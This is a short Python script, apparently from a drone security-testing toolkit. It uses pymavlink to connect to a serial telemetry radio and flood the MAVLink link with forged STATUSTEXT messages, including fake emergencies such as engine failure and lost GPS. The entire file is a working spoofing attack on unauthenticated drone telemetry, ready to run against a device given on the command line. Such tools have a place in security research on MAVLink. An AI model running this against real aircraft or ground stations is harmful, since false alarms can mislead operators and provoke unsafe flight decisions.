from pymavlink import mavutil
import time
import sys
import random

def create_mav():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav

def create_statustext(mav, severity, text):
    return mav.statustext_encode(
        severity=severity,
        text=text.encode('utf-8')
    ).pack(mav)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python attacks/spoofing/emergency_status.py <serial_device>")
        print("Example: python attacks/spoofing/emergency_status.py /dev/ttyUSB0")
        sys.exit(1)

    serial_device = sys.argv[1]
    baud_rate = 57600  # Change if necessary

    conn = mavutil.mavlink_connection(serial_device, baud=baud_rate)
    mav = create_mav()

    messages = [
        (0, "EMERGENCY: Immediate action required"),
        (1, "ALERT: Attention needed"),
        (2, "CRITICAL: Engine failure"),
        (3, "ERROR: GPS signal lost"),
        (4, "WARNING: High temperature detected"),
        (5, "NOTICE: System check complete"),
        (6, "INFO: Battery at 50%"),
        (7, "DEBUG: Diagnostic mode enabled")
    ]

    while True:
        severity, message = random.choice(messages)
        conn.write(create_statustext(mav, severity, message))
        print(f"[>] Sent STATUSTEXT with severity {severity}: '{message}'")
